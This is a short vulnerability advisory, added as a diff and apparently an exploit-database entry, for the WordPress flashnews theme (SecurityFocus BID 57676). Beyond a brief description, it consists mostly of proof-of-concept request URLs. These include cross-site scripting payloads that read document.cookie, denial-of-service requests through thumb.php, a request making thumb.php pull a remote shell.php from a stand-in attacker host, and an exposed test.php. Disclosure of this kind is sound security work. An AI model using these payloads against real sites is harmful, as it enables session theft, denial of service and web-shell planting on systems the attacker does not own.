@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/57676/info
+
+The flashnews Theme for WordPress is prone to multiple input-validation vulnerabilities. 
+
+An attacker may leverage these issues to cause denial-of-service conditions, disclose sensitive information, upload arbitrary files to the affected computer, or execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+http://www.example.com/wp-content/themes/flashnews/thumb.php?src=%3Cbody%20onload=alert(document.cookie)%3E.jpg [XSS] 
+
+http://www.example.com/wp-content/themes/flashnews/thumb.php?src=http://site/big_file&h=1&w=1 
+
+http://www.example.com/wp-content/themes/flashnews/thumb.php?src=http://site.badsite.com/big_file&h=1&w=1 
+
+http://www.example.com/wp-content/themes/flashnews/thumb.php?src=http://site.badsite.com/shell.php 
+
+http://www.example.com/wp-content/themes/flashnews/includes/test.php 
+
+http://www.example.com/wp-content/themes/flashnews/includes/test.php?a[]=%3Cscript%3Ealert(document.cookie)%3C/script%3E [XSS]
